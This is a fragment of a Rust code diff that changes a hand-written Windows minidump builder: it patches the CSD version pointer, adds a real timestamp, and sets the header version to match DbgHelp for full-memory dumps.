+    buf.extend_from_slice(&[0u8; 2]);           // Null terminator (UTF-16)
+
     // --- Stream 1: SystemInfo ---
     let sys_info_rva = buf.len() as u32;
+    // Patch csd_version_rva to point to our CSD string
+    let mut patched_info = *sys_info;
+    patched_info.csd_version_rva = csd_rva;
     let sys_info_bytes = unsafe {
         std::slice::from_raw_parts(
-            sys_info as *const _ as *const u8,
+            &patched_info as *const _ as *const u8,
             std::mem::size_of::<MinidumpSystemInfo>(),
         )
     };
@@ -856,13 +1383,17 @@ fn build_minidump(
     }
 
     // --- Write header ---
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs() as u32;
     let header = MinidumpHeader {
         signature: MINIDUMP_SIGNATURE,
-        version: MINIDUMP_VERSION,
+        version: MINIDUMP_VERSION | (0x0006 << 16), // 0x0006A793 — matches DbgHelp
         number_of_streams: num_streams,
         stream_directory_rva: header_size as u32,
         checksum: 0,
-        timestamp: 0,
+        timestamp,
         flags: 0x00000002, // MiniDumpWithFullMemory
     };
     let header_bytes =
